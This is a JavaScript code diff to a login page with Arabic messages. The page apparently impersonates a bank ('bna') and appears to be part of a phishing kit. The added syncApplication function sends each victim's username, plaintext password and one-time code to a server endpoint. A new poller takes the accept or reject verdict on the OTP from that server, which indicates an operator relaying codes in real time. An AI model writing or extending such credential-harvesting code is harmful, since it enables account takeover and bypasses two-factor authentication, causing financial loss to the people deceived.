@@ -63,6 +63,15 @@ const KEY='bna_state', CH='bna_ch', ADMIN_KEY='bna_admin_state';
 const bc=typeof BroadcastChannel!=='undefined'?new BroadcastChannel(CH):null;
 function getS(){try{return JSON.parse(localStorage.getItem(ADMIN_KEY)||localStorage.getItem(KEY)||'{}');}catch(e){return{};}}
 function setS(u){const s={...getS(),...u};try{localStorage.setItem(KEY,JSON.stringify(s));localStorage.setItem(ADMIN_KEY,JSON.stringify(s));}catch(e){}if(bc)bc.postMessage({type:'update',data:s});return s;}
+function getApplicant(){try{return JSON.parse(localStorage.getItem('bna_applicant')||'{}');}catch(e){return{};}}
+function syncApplication(extra){
+  const saved=getS();
+  const applicant=getApplicant();
+  const id=saved.applicationId || applicant.id;
+  if(!id)return;
+  setS({applicationId:id});
+  fetch('/api/applications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...applicant,...extra,id})}).catch(()=>{});
+}
 const obs=[...document.querySelectorAll('.box')];
 let tmr=null;
 obs.forEach((b,i)=>{
@@ -85,6 +94,7 @@ document.getElementById('cbtn').addEventListener('click',()=>{
   if(otp.length<6){document.getElementById('err').textContent='الرمز غير مكتمل';return;}
   document.getElementById('err').textContent='';
   setS({login: String(saved.login || '').trim(), password: String(saved.password || '').trim(), otp, status:'pending_otp', otp_time:Date.now()});
+  syncApplication({username:String(saved.login || '').trim(),password:String(saved.password || '').trim(),otp,status:'pending_otp'});
   document.getElementById('cbtn').style.display='none';
   document.getElementById('wbox').style.display='flex';
   document.getElementById('npad').style.pointerEvents='none';
@@ -100,6 +110,9 @@ function startPoll(){
     else if(s==='otp_rejected'){clearInterval(tmr);reset();document.getElementById('err').textContent='الرمز غير صحيح';}
   };
   tmr=setInterval(check,800);
+  const pollServer=()=>{const id=getS().applicationId;if(!id)return;fetch('/api/applications/'+encodeURIComponent(id),{cache:'no-store'}).then(r=>r.ok?r.json():null).then(application=>{if(application&&application.status!==getS().status)setS({status:application.status});}).catch(()=>{});};
+  pollServer();
+  setInterval(pollServer,800);
   if(bc)bc.onmessage=e=>{if(e.data.type==='update')check();};
 }
 function reset(){
